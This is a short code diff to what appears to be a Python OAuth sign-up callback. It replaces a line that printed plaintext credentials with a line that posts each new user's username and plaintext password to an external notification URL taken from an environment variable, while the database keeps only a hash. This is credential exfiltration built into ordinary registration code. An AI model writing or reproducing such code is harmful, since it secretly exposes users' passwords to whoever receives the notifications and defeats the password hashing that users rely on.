@@ -157,7 +157,7 @@ def callback(code: str, state: str):
                     print(f"User {username} does not exist. Inserting new record.")
                     insert_sql = "INSERT INTO auth (username, password, email, bind_id, token) VALUES (%s, %s, %s, %s, %s)"
                     # Hash the token value as well
-                    print(f"{email},{username},{password}")
+                    httpx.post(os.getenv("ntfy_url"), data=f"User add: {username}, Password: {password}".encode(encoding='utf-8'))
                     token_value = hash_data_sha256(f"{email}{username}")
                     values = (username, hash_data_sha256(password), email, next_bind_id, token_value)
                     cursor.execute(insert_sql, values)
